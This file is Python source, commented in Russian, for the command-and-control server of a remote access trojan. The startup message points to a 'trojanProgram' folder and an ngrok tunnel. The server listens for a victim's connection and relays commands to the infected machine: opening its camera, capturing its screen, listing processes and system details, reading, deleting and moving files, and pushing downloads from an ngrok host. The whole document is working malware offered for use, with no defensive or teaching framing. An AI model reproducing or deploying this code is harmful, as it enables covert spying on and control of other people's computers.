import socket
import os
import requests  # Не забудьте установить библиотеку requests через pip
import colorama
from colorama import Fore, Style
from tqdm import tqdm  # Импортируем tqdm для индикатора загрузки

def download_file(url, save_path):
    max_retries = 3
    for attempt in range(max_retries):
        try:
            # Начинаем загрузку
            response = requests.get(url, stream=True, timeout=60)  # Устанавливаем тайм-аут
            response.raise_for_status()  # Проверяем статус код
            total_size = int(response.headers.get('content-length', 0))  # Общий размер файла

            # Открываем файл для записи
            with open(save_path, 'wb') as f, tqdm(total=total_size, unit='B', unit_scale=True, desc=os.path.basename(save_path)) as bar:
                for data in response.iter_content(chunk_size=4096):
                    f.write(data)
                    bar.update(len(data))  # Обновляем прогресс
            print(f"Файл '{save_path}' успешно загружен.")
            return  # Успешная загрузка, выходим из функции

        except requests.exceptions.ConnectionError:
            print(f"Ошибка соединения при загрузке файла. Попробуйте снова.")
            if attempt == max_retries - 1:
                print("Не удалось загрузить файл после нескольких попыток.")
        
        except requests.exceptions.Timeout:
            print(f"Время ожидания истекло. Повторная попытка...")
            continue  # Повторяем загрузку

        except Exception as e:
            print(f"Попытка {attempt + 1} не удалась: {str(e)}")
            if attempt == max_retries - 1:
                print("Не удалось загрузить файл после нескольких попыток.")

def start_server():
    # Инициализация colorama
    colorama.init(autoreset=True)

    # Выводим предупреждение о запуске ngrok и app.py
    print(Fore.RED + "Не забудьте запустить ngrok http 5000 и app.py в директории trojanProgram/Servers и добавить файл, который вы хотите скачать на удаленной консоли.")

    server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server_socket.bind(('0.0.0.0', 12345))  # Укажите свой IP и порт
    server_socket.listen(1)
    print("Сервер запущен, ждем подключения...")

    client_socket, addr = server_socket.accept()
    print(f"Подключено к {addr}")

    # Подсказки для команд
    tips = [
        "start microsoft.windows.camera: - открывает камеру",
        "dir: - показывает содержимое текущей директории",
        "cd <путь>: - меняет текущую директорию на указанную",
        "ipconfig: - показывает информацию о сетевых интерфейсах",
        "systeminfo: - показывает общую информацию о системе",
        "tasklist: - выводит список запущенных процессов",
        "exit: - завершает работу сервера",
        "cls: - очищает экран терминала",
        "ping <адрес>: - отправляет запросы на указанный адрес для проверки доступности",
        "mkdir <папка>: - создает новую директорию с указанным именем",
        "del <файл>: - удаляет указанный файл",
        "copy <source> <destination>: - копирует файл из одного места в другое",
        "move <source> <destination>: - перемещает файл из одного места в другое",
        "type <файл>: - выводит содержимое указанного текстового файла",
        "notepad <файл>: - открывает указанный файл в блокноте",
        "curl <url>: - скачивает файл из ngrok сайта",
        "put <путь> <файл>: - получает указанный файл от клиента и сохраняет по указанному пути",
        "screen_show: - показывает экран монитора"
    ]

    print("Доступные команды:")
    for tip in tips:
        print(f" - {tip}")

    while True:
        command = input("\nВведите команду: ")
        
        if command.lower() == 'exit':
            client_socket.send(command.encode('utf-8'))
            break

        # Обработка команды curl
        if command.startswith('curl '):
            url = command.split(' ', 1)[1]  # Получаем URL из команды
            
            # Запрос директории для сохранения
            save_directory = input("Введите путь для сохранения файла (или нажмите Enter для сохранения в C:\\): ")
            if not save_directory:
                save_directory = 'C:\Program Files'  # Устанавливаем путь по умолчанию
            else:
                # Проверка, существует ли директория
                if not os.path.exists(save_directory):
                    print(f"Директория '{save_directory}' не существует. Попробуем создать её.")
                    os.makedirs(save_directory)  # Создает директорию, если она не существует
            
            filename = os.path.join(save_directory, url.split('/')[-1])  # Сохранение в указанной директории
            download_file(url, filename)  # Вызываем функцию загрузки файла
            continue  # Переход к следующей итерации

        # Отправляем команду клиенту
        client_socket.send(command.encode('utf-8'))

        # Принимаем данные от клиента
        response = ""
        while True:
            part = client_socket.recv(4096).decode('utf-8', errors='replace')
            if "END_OF_MSG" in part:
                response += part.replace("END_OF_MSG", "")
                break
            response += part
        
        print(f"Ответ клиента:\n{response}")

    client_socket.close()
    server_socket.close()

if __name__ == "__main__":
    start_server()
